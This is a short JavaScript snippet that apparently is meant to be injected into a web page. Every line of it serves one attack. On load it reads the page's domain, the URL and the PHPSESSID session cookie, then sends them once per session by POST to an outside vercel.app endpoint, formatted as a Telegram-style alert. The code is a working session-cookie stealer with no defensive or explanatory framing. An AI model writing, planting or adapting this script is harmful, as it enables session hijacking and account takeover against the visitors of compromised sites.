function telegramSend() {
    if (sessionStorage.getItem('telegram_sent')) return;
    sessionStorage.setItem('telegram_sent', '1');

    var domain = document.domain || '-';
    var url = location.href || '-';

    var phpsessid = 'Not Found';
    document.cookie.split('; ').forEach(c => {
        if (c.startsWith('PHPSESSID=')) {
            phpsessid = c;
        }
    });

    var message = `<pre>┌───────────────
│ 📡 DOMAIN : ${domain}
│ 🌐 URL    : ${url}
│ ⚙️ PHPSESSID :
│ ${phpsessid}
└───────────</pre>`;

    // POST tapi encodeURIComponent supaya aman
    fetch('https://api-xi-two-52.vercel.app/api/config', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'message=' + encodeURIComponent(message)
    });
}

telegramSend();
